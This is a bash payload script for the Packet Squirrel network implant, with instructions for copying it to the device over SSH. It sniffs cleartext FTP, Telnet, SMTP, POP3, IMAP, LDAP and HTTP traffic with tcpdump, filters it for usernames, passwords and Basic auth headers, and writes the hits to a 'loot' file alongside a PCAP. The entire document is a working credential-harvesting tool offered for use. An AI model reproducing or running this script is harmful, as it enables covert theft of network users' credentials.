#!/bin/bash
# ================================================================
#  Packet Squirrel — credsniff-passive
#  Description : Inline cleartext credential sniffer. Captures
#                traffic on cleartext protocols (FTP, Telnet, SMTP,
#                POP3, IMAP, HTTP, LDAP) and extracts credential
#                indicators to a live hits file. Runs continuously
#                until unplugged (Switch position change). PCAP also
#                saved for offline extraction with tshark.
#  Device      : Packet Squirrel (Mk I / Mk II, OpenWrt)
#  Author      : <operator>
#  Deploy      : Copy to /root/payload/payload.sh via SSH
# ================================================================

LED SETUP
sleep 5

LOOT_DIR=/root/loot/credsniff-$(date +%Y%m%d_%H%M%S)
mkdir -p "$LOOT_DIR"
HITS_FILE="${LOOT_DIR}/credential_hits.txt"
PCAP="${LOOT_DIR}/cleartext_protocols.pcap"
IFACE=eth0

CRED_FILTER='tcp port 21 or tcp port 23 or tcp port 25 or
             tcp port 110 or tcp port 143 or tcp port 389 or
             tcp port 587 or tcp port 80 or tcp port 8080'

LED ATTACK

echo "[*] Credential sniffer active on $IFACE"
echo "[*] Protocols: FTP/Telnet/SMTP/POP3/IMAP/LDAP/HTTP"

# PCAP in background
tcpdump -i "$IFACE" -w "$PCAP" "$CRED_FILTER" \
    --buffer-size=2048 2>/dev/null &
PCAP_PID=$!

# Live ASCII stream — pipe through grep for credential indicators
{
    tcpdump -i "$IFACE" -A -nn "$CRED_FILTER" 2>/dev/null | \
    grep -a --line-buffered -iE \
        'USER |PASS |LOGIN |AUTH |Authorization: Basic |MAIL FROM|RCPT TO|BIND DN|password|username' | \
    while IFS= read -r line; do
        echo "[$(date +%H:%M:%S)] $line" | tee -a "$HITS_FILE"
    done
} &
GREP_PID=$!

cleanup() {
    kill "$PCAP_PID" "$GREP_PID" 2>/dev/null || true
    HITS=$(wc -l < "$HITS_FILE" 2>/dev/null || echo 0)
    echo "[+] Credential hits: $HITS"
    echo "[+] PCAP: $PCAP"
    LED FINISH
}
trap cleanup EXIT INT TERM

wait "$PCAP_PID"
